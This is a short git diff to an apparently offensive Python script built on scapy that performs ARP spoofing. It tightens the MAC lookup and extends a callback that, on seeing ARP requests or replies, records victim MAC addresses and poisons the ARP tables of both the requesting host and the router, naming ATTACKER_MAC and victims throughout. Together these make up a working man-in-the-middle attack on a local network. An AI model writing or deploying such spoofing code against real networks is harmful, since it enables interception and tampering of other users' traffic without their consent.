@@ -24,7 +24,7 @@ def get_mac(ip):
     elif ip == router_ip:
         response_mac = router_mac
     
-    if response_mac:
+    if response_mac and response_mac != "ff:ff:ff:ff:ff:ff":
         return response_mac
     
     # creating an ARP request to the ip address
@@ -148,15 +148,19 @@ def arp_silent():
 
 #When an arp request or answer is detected, spoof the arp table, also answer to override it.
 def arp_scout_callback(packet):
-    if packet[scapy.Ether].src == ATTACKER_MAC:
+    src_mac = packet[scapy.Ether].src
+    if src_mac == ATTACKER_MAC:
         return
     if packet.haslayer(scapy.ARP):
         
         requestor_ip = None
         if packet[scapy.ARP].op == 1:
             requestor_ip = packet[scapy.ARP].psrc
-        else :
+            victim_addresses[requestor_ip] = src_mac
+        elif packet[scapy.ARP].op == 2:
             requestor_ip = packet[scapy.ARP].pdst
+        else :
+            return #?
 
         arp_spoof(requestor_ip, router_ip)
         arp_spoof(router_ip, requestor_ip)
